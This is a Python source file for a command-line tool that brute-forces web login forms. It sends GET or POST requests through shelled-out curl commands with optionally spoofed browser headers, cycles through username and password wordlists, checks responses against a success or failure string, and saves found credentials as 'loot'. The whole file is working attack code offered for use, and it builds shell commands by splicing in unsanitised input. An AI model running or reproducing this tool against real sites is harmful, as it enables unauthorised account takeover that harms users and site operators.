#!/usr/bin/python3
from argparse import ArgumentParser as AP
from subprocess import getoutput as Bash
from os import getuid as Priv
from sys import exit as Exit

"""  Handles Errors  """


def Handler(error):
    print("[!] " + error)
    Exit(1)


"""  Check Privileges  """


def Escalate():
    uid = Priv()
    if uid != 0:
        Handler("Run as root")


"""  Parse Command Line Arguments  """


def Args():
    ## ARGUMENT PARSER
    parser = AP(description="Remote Password Cracking")
    ## Target Scope
    parser.add_argument("-t", dest="target", help="specify target remote host")
    parser.add_argument("-u", dest="uripath", help="specify target uripath")
    ## Attack Vectors
    parser.add_argument(
        "-i", dest="inject", help="user=^USER^&pass=^PASS^&submit=submit"
    )
    parser.add_argument(
        "-m", dest="message", help="F=failed message  <- OR -> S=success message"
    )
    ## Header Fields
    parser.add_argument("-f", dest="formtype", help="specify form type: GET or POST")
    parser.add_argument("-a", dest="agent", help="specify a custom user agent")
    parser.add_argument("-r", dest="refpath", help="specify the local referer path")
    parser.add_argument("-R", dest="referer", help="specify any referer url")
    parser.add_argument(
        "-c", dest="cookies", help="specify a cookie or string of cookies"
    )
    ## User Field
    parser.add_argument("-l", dest="username", help="specify a single username to use")
    parser.add_argument("-L", dest="userfile", help="specify users wordlist file")
    ## Password Field
    parser.add_argument("-p", dest="password", help="specify a single password to use")
    parser.add_argument("-P", dest="passfile", help="specify a password wordlist file")
    ## Output File
    parser.add_argument(
        "-o", dest="outfile", help="specify output file to write credentials to"
    )
    ## Flags
    parser.add_argument(
        "-s", dest="secure", action="store_true", help="use https instead of http"
    )
    parser.add_argument(
        "-b",
        dest="browser",
        action="store_true",
        help="modify request to look like a real browser",
    )
    parser.add_argument(
        "-U",
        dest="useronly",
        action="store_true",
        help="only brute force users and not passwords",
    )
    parser.add_argument(
        "-e",
        dest="exitfast",
        action="store_true",
        help="exit after first cracked login",
    )
    parser.add_argument(
        "-v", dest="verb", action="store_true", help="increase output verbosity"
    )
    parser.add_argument(
        "-d", dest="debugging", action="store_true", help="debugging dry run"
    )
    args = parser.parse_args()
    return args


"""  Catches Exceptions  """


def Check(args):
    ## Initial Diagnostics
    if not args.target:
        Handler("Missing Target (-t)")
    if not args.uripath:
        Handler("Missing URI Path (-u)")
    ## Header Diagnosis
    if not args.formtype:
        Handler("Missing Form Type (-f)")
    else:
        if "GET" not in args.formtype.upper():
            if "POST" not in args.formtype.upper():
                Handler("Invalid Form Type")
    if args.refpath and args.referer:
        Handler("Invalid Usage of Referer Argument")
    ## Attack Vector Diagnosis
    if not args.inject:
        Handler("Missing Injection Field (-i)")
    else:
        if "^USER^" not in args.inject:
            Handler("Missing ^USER^ Field")
        if not args.useronly:
            if "^PASS^" not in args.inject:
                Handler("Missing ^PASS^ Field")
            if not args.passfile and not args.password:
                Handler("Missing Password (-p or -P)")
    ## Form Field Diagnostics
    if args.useronly:
        if not args.userfile:
            Handler("Wordlist Required In User Only Mode")
    else:
        if args.username and args.password:
            Handler("One Field Must Be A Wordlist")
    ## Response Diagnostics
    if not args.message:
        Handler("Missing Response Message (-m)")
    else:
        if "S=" not in args.message.upper():
            if "F=" not in args.message.upper():
                Handler("Invalid Response Message")


def Scope(args, trigger):
    if args.secure:
        prefix = "https://"
    else:
        prefix = "http://"
    url = prefix + args.target
    if trigger == 1:
        url = url + args.uripath
    return url


def Agent(args):
    if args.browser:
        agent = ""
        agent += "Mozilla/5.0 "
        agent += "(X11; Linux x86_64; rv:52.0) "
        agent += "Gecko/20100101 "
        agent += "Firefox/52.0"
    else:
        if args.agent:
            agent = args.agent
        else:
            agent = "Anonymous"
    return agent


def Middle(url, args):
    body = "Accept: "
    if args.browser:
        body += "text/html,application/xhtml+xml,"
        body += "application/xml;q=0.9,*/*;q=0.8"
        body += "' -H '"
        body += "Accept-Language: en-US,en;q=0.5"
        body += "' --compressed -H '"
    else:
        body += "text/html"
        body += "' -H '"
        body += "Accept-Language: en-US,en"
        body += "' -H '"
    if args.referer:
        body += "Referer: " + args.referer + "' -H '"
    elif args.refpath:
        temp = Scope(args, 0)
        base = temp + args.refpath
        body += "Referer: " + base + "' -H '"
    else:
        body += "Referer: " + url + "' -H '"
    if args.cookies:
        body += "Cookie: " + args.cookies + "' -H '"
    return body


def Ending(args):
    ending = ""
    if args.browser:
        ending += "DNT: 1' -H '"
        ending += "Connection: close' -H '"
        ending += "Upgrade-Insecure-Requests: 1'"
    else:
        ending += "Connection: close'"
    return ending


def Getter(command, args):
    prefix = command[0]
    payload = command[1] + "?"
    payload += args.inject
    suffix = command[2]
    cmd = prefix + payload + suffix
    return cmd


def Poster(command, args):
    prefix = command[0] + command[1]
    middle = command[2] + " --data '"
    payload = args.inject
    cmd = prefix + middle + payload + "'"
    return cmd


def Build(url, args):
    command = []
    gap = "' -H '"
    top = "/usr/bin/curl -s -i '"
    body = gap + "Host: " + args.target
    body += gap + "User-Agent: " + Agent(args)
    body += gap + Middle(url, args) + Ending(args)
    command.append(top)
    command.append(url)
    command.append(body)
    if "GET" in args.formtype:
        cmd = Getter(command, args)
    else:
        cmd = Poster(command, args)
    return cmd


def Load(wordlist, name):
    with open(wordlist, "r") as f:
        data = f.read().strip()
    words = data.split("\n")
    print("[+] Loaded <" + str(len(words)) + "> " + name)
    return words


def Send(payload, args):
    html = Bash(payload)
    if args.debugging:
        print("\n********  Testing Response  ********\n")
        print(html)
        Exit(1)
    message = args.message
    code = message[0]
    msg = message[2:]
    if code.upper() == "S":
        if msg in html:
            return True
        else:
            return False
    else:
        if msg not in html:
            return True
        else:
            return False


def Main():
    Escalate()
    args = Args()
    Check(args)
    url = Scope(args, 1)
    cmd = Build(url, args)
    if args.debugging:
        string = str(args)
        string = string[10:]
        data = string.split(" ")
        print("\n********  Arguments  ********\n")
        for x in data:
            x = x[: len(x) - 1]
            print(x)
        print("\n********  Curl Command  ********\n")
        print(cmd)
    creds = []
    counter = 0
    ## Users Only Mode
    if args.useronly:
        users = Load(args.userfile, "users")
        total = len(users)
        half = total // 2
        quarter = half // 2
        trips = quarter + half
        for user in users:
            counter += 1
            # data = Encode(user)
            if " " in user:
                data = user.replace(" ", "+")
            else:
                data = user
            payload = cmd.replace("^USER^", data)
            if args.verb:
                print("[*] Trying: " + user)
            else:
                if counter == quarter:
                    print("[+] ---- 25% ----")
                elif counter == half:
                    print("[+] ---- 50% ----")
                elif counter == trips:
                    print("[+] ---- 75% ----")
            if Send(payload, args):
                print("[+] Found: " + user)
                loot = "U:" + user
                if args.exitfast:
                    if args.outfile:
                        f = open(args.outfile, "w")
                        f.write(loot + "\n")
                        f.close()
                    Exit(1)
                else:
                    creds.append(loot)
    ## Multi Variable Cracking Mode
    else:
        if args.username and args.passfile:
            ## single user --> password cracking
            username = args.username
            if " " in username:
                user = username.replace(" ", "+")
            else:
                user = username
            # user = Encode(username)
            usercmd = cmd.replace("^USER^", user)
            passwords = Load(args.passfile, "passwords")
            total = len(passwords)
            half = total // 2
            quarter = half // 2
            trips = quarter + half
            for password in passwords:
                counter += 1
                # pword = Encode(password)
                if " " in password:
                    pword = password.replace(" ", "+")
                else:
                    pword = password
                payload = usercmd.replace("^PASS^", pword)
                if args.verb:
                    string = "[*] Trying: " + username
                    string += " --> " + password
                    print(string)
                else:
                    if counter == quarter:
                        print("[+] ---- 25% ----")
                    elif counter == half:
                        print("[+] ---- 50% ----")
                    elif counter == trips:
                        print("[+] ---- 75% ----")
                if Send(payload, args):
                    string = "[+] Found: " + username
                    string += " --> " + password
                    print(string)
                    loot = "U: " + user + " --> P: " + password
                    if args.exitfast:
                        if args.outfile:
                            f = open(args.outfile, "w")
                            f.write(loot + "\n")
                            f.close()
                        Exit(1)
                    else:
                        creds.append(loot)
        elif args.password and args.userfile:
            ## single password --> user cracking
            password = args.password
            # pword = Encode(password)
            if " " in password:
                pword = password.replace(" ", "+")
            else:
                pword = password
            passcmd = cmd.replace("^PASS^", pword)
            users = Load(args.userfile, "users")
            total = len(users)
            half = total // 2
            quarter = half // 2
            trips = quarter + half
            for user in users:
                counter += 1
                # data = Encode(user)
                if " " in password:
                    data = user.replace(" ", "+")
                else:
                    data = user
                payload = passcmd.replace("^USER^", data)
                if args.verb:
                    string = "[*] Trying: " + user
                    string += " --> " + password
                    print(string)
                else:
                    if counter == quarter:
                        print("[+] ---- 25% ----")
                    elif counter == half:
                        print("[+] ---- 50% ----")
                    elif counter == trips:
                        print("[+] ---- 75% ----")
                if Send(payload, args):
                    string = "[+] Found: " + user
                    string += " --> " + password
                    print(string)
                    loot = "U: " + user + " --> P: " + password
                    if args.exitfast:
                        if args.outfile:
                            f = open(args.outfile, "w")
                            f.write(loot + "\n")
                            f.close()
                        Exit(1)
                    else:
                        creds.append(loot)
        else:
            ## throw a hail mary
            users = Load(args.userfile, "users")
            total = len(users)
            half = total // 2
            quarter = half // 2
            trips = quarter + half
            passwords = Load(args.passfile, "passwords")
            for user in users:
                counter += 1
                # uword = Encode(user)
                if " " in user:
                    uword = user.replace(" ", "+")
                else:
                    uword = user
                usercmd = cmd.replace("^USER^", uword)
                for password in passwords:
                    # pword = Encode(password)
                    if " " in password:
                        pword = password.replace(" ", "+")
                    else:
                        pword = password
                    payload = usercmd.replace("^PASS^", pword)
                    if args.verb:
                        string = "[*] Trying: " + user
                        string += " --> " + password
                        print(string)
                    else:
                        if counter == quarter:
                            print("[+] ---- 25% ----")
                        elif counter == half:
                            print("[+] ---- 50% ----")
                        elif counter == trips:
                            print("[+] ---- 75% ----")
                    if Send(payload, args):
                        string = "[+] Found: " + user
                        string += " --> " + password
                        print(string)
                        loot = "U: " + user + " --> P: " + password
                        if args.exitfast:
                            if args.outfile:
                                f = open(args.outfile, "w")
                                f.write(loot + "\n")
                                f.close()
                            Exit(1)
                        else:
                            creds.append(loot)

    if creds:
        if args.outfile:
            f = open(args.outfile, "w")
            for cred in creds:
                f.write(cred + "\n")
            f.close()
        else:
            print("\n[+][+]  Loot  [+][+]")
            for cred in creds:
                print(cred)


if __name__ == "__main__":
    Main()
